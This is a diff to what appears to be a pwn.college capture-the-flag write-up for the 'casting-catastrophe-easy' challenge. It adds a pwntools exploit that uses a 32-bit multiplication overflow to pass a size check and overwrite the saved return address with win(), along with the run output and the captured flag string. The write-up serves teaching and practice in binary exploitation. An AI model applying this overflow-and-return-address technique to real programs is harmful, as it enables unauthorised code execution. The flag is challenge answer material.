@@ -2482,8 +2482,111 @@ When 65536 is multiplied with 65536, the result is $4,294,967,296$, whose hexade
 
 As we can see, even if the result is a huge number ($4,294,967,296$), the value within `eax` is $0$.
 
+Before we craft our exploit, we need the address of `win()`.
+
+### `win()`
+
+```
+pwndbg> info address win
+Symbol "win" is at 0x4022d7 in a file compiled without debugging.
+```
+
 ### Exploit.
 
+```py title="~/script.py" showLineNumber
+from pwn import *
+
+p = process('/challenge/casting-catastrophe-easy')
+
+# Initialize values
+buffer_addr = 0x7ffcf11c6c80
+addr_of_stored_ip = 0x7ffcf11c6d08
+win_func_addr = 0x4022d7
+
+# Calculate offset & payload_size
+offset = addr_of_stored_ip - buffer_addr
+records_num = 65536
+records_size = 65536
+
+# Build payload
+payload = b"A" * offset
+payload += p64(win_func_addr)
+
+# Send number of records
+p.recvuntil(b'Number of payload records to send: ')
+p.sendline(str(records_num))
+
+# Send size of records
+p.recvuntil(b'Size of each payload record: ')
+p.sendline(str(records_size))
+
+# Send payload
+p.recvuntil(b'Send your payload')
+p.send(payload)
+
+p.interactive() 
 ```
 
 ```
+hacker@program-security~casting-catastrophe-easy:~$ python ~/script.py 
+[+] Starting local process '/challenge/casting-catastrophe-easy': pid 1314
+/home/hacker/script.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(records_num))
+/home/hacker/script.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(records_size))
+[*] Switching to interactive mode
+ (up to 4294967296 bytes)!
+[*] Process '/challenge/casting-catastrophe-easy' stopped with exit code -11 (SIGSEGV) (pid 1314)
+You sent 144 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffd9b661830 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
+| 0x00007ffd9b661838 (rsp+0x0008) | 18 2a 66 9b fd 7f 00 00 | 0x00007ffd9b662a18 |
+| 0x00007ffd9b661840 (rsp+0x0010) | 08 2a 66 9b fd 7f 00 00 | 0x00007ffd9b662a08 |
+| 0x00007ffd9b661848 (rsp+0x0018) | 23 d7 e0 b0 01 00 00 00 | 0x00000001b0e0d723 |
+| 0x00007ffd9b661850 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007ffd9b661858 (rsp+0x0028) | 00 00 01 00 00 00 01 00 | 0x0001000000010000 |
+| 0x00007ffd9b661860 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b661868 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b661870 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b661878 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b661880 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b661888 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b661890 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b661898 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b6618a0 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b6618a8 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b6618b0 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b6618b8 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b6618c0 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b6618c8 (rsp+0x0098) | 41 41 41 41 90 00 00 00 | 0x0000009041414141 |
+| 0x00007ffd9b6618d0 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b6618d8 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b6618e0 (rsp+0x00b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffd9b6618e8 (rsp+0x00b8) | d7 22 40 00 00 00 00 00 | 0x00000000004022d7 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x4141414141414141
+- the saved frame pointer (of main) is at 0x7ffd9b6618e0
+- the saved return address (previously to main) is at 0x7ffd9b6618e8
+- the saved return address is now pointing to 0x4022d7.
+- the address of win() is 0x4022d7.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win() when it returns.
+Let's try it now!
+
+Goodbye!
+You win! Here is your flag:
+pwn.college{AHvK09p2sS2HAcH9C1wLClyOklX.01N5IDL4ITM0EzW}
+
+
+[*] Got EOF while reading in interactive
+$  
+```
+
+&nbsp;
+
